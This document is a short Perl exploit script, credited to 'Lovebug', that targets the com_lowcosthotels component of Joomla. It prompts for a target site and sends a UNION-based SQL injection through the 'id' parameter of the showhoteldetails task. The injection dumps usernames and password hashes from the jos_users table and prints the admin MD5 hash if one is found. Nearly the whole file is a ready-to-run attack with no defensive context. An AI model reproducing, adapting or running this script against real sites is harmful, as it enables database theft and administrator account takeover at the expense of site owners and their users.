#!/usr/bin/perl 
#Joomla com_lowcosthotels Sql injection#
########################################
#[] Author :  Lovebug
#[] www.rbt-4.net
#[] Module_Name:  com_lowcosthotels
#[] Script_Name:  Joomla
########################################
 
use LWP::UserAgent;
 
print "\n Target :   http://wwww.site.com/path/   : ";
 chomp(my $target=<STDIN>);
 
$cn="concat(username,0x3a,password)";
$table_name="jos_users";
 
$br = LWP::UserAgent->new() or die "Could not initialize browser\n";
$br->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
 
$host = $target .   "/index.php?option=com_lowcosthotels&task=showhoteldetails&id=1+union+select+1,".$cn."+from/**/".$table_name."--";
$res = $br->request(HTTP::Request->new(GET=>$host));$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
  print "\n[+] Admin Hash : $1\n\n";
  
}
else{print "\n[-] Exploit failed.\n";
}
